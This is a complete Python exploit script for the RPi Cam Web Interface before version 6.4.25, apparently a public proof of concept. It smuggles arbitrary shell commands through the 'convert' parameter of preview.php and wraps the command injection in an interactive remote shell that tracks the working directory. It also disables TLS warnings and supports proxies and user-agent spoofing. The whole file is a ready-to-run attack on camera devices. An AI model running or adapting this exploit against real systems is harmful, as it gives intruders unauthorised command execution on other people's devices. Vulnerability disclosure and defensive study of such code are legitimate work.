#!/usr/bin/env python3

import argparse
import sys
import requests
import os
import re
import readline
import urllib3

# Nobody wants to see SSL warnings :-P
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def execute_command(cmd):
	
	split = "---a97a13f9f48c65c72e4802fc1e516e3f---"
	convert = ".) >/dev/null 2>&1; (" + cmd + ") 2>&1; echo " + split + ";#aaaaaaa"
	convertCmd = "/usr/bin/ffmpeg -f image2 -i i_%05d.jpg"
	data = {"convert":convert,"convertCmd":convertCmd}
	headers = {"User-Agent": useragent}

	try:
		r = requests.post(url, headers=headers, data=data, proxies=proxies, verify=False)
		if r.status_code == 200:
			if len(r.text) > 0 and split in r.text:
				return r.text.split(split)[0]
			else:
				return ""
		else:
			print("\n[*] Error: Received HTTP Status " + str(r.status_code) + "\n")
			return ""	
	except requests.ConnectionError as e:
		print("\n[*] Error: An error occurred while connecting to the host.\n")
		exit(1)
	except requests.exceptions.RequestException as e:
		print("\n[*] Error: Something unexpected happened.\n")
		print(e)
		exit(1)

if __name__ == "__main__":

	parser = argparse.ArgumentParser(
	description='RPi Cam Web Interface < 6.4.25 Exploit',
	epilog = '''
Examples:
{0}
{0} -p http://127.0.0.1:8080
{0} -p http://127.0.0.1:8080 -u \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \''''.format(sys.argv[0]),
	formatter_class=argparse.RawDescriptionHelpFormatter)
 
	parser.add_argument('-t', '--target', help='http://host/path/to/preview.php', required=True, default=None, type=str, dest='target')
	parser.add_argument('-p', '--proxy', help='Proxy example: http://127.0.0.1:8080', required=False, default=None, type=str, dest='proxy')
	parser.add_argument('-u', '--useragent', help='User agent string to make requests with', required=False, default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36', type=str, dest='useragent')
 
	args = parser.parse_args()
 
	# Global Variables
 
	useragent = args.useragent
	if args.proxy:
		proxies = {'http': args.proxy, 'https': args.proxy}
	else:
		proxies = None
	url = args.target

	print("\nRPi Cam Web Interface < 6.4.25 Exploit")

	print("\n[*] Attempting exploit on: {0}".format(url))

	username = execute_command("whoami").strip()
	if len(username) == 0:
		exit(1)
        
	hostname = execute_command("hostname").strip()

	path = execute_command("pwd").strip()

	print("\n[*] Returning prompt!\n")

	try:
		while True:
			prompt = username + "@" + hostname + ":" + path + "$ " 
			cmd = input(prompt)
			if cmd == "exit":
				print("\n[*] Goodbye!\n")
				break
			elif cmd.startswith("cd "):
				chars = set(";&|")
				if any((c in chars) for c in cmd):
					print("[!] This shell only supports cd as a standalone command.")
				else:
					cmd = cmd.split()
					tmpPath = " ".join(cmd[1:])
					if tmpPath == "..":
						if len(path.split("/")) > 2:
							tmpPath = "/".join(path.split("/")[:-1])
						else:
							tmpPath = "/"
					cmd = "cd " + path + " && cd " + tmpPath + " 2>&1 && pwd"
					tmpPath = execute_command(cmd).strip()
					if tmpPath.startswith("/") or re.match("^[a-zA-Z]:\\)*",tmpPath):
						path = tmpPath
					else:
						print(tmpPath.split('\n')[0])
			elif cmd == "clear":
				os.system("clear")
			else:
				cmd = "cd " + path + " && " + cmd
				results = execute_command(cmd)
				if len(results) != 0:
					print(results)

	except KeyboardInterrupt:
		print("\n\n[*] Goodbye!\n")
